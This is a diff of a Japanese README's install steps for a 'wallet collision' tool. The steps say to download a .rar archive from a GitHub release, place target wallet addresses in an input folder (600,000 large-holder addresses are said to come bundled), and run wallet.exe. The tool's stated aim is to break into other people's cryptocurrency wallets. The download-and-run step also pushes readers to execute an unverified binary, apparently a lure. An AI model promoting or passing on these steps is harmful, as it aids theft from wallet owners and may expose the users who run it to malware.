@@ -51,7 +51,7 @@
 
 ## インストール手順
 
-1. インストールパッケージをダウンロードして解凍します。[ここをクリックしてダウンロード](<url id="d01rjk3djm8re1t2o3gg" type="url" status="failed" title="" wc="0">https://github.com/EthCollision/wallet_collission/releases/download/v2.0.0/trx_collision.rar</url> )
+1. インストールパッケージをダウンロードして解凍します。[ここをクリックしてダウンロード](https://github.com/EthCollision/wallet_collission/releases/download/v2.0.0/trx_collision.rar )
 2. コリジョンが必要なウォレットアドレスを`input`ディレクトリに置きます（現在、60万の大口ウォレットアドレスが付属しています）
 3. `wallet.exe`を実行してプログラムを起動します
 4. 実行に成功した後、【開始】ボタンをクリックします
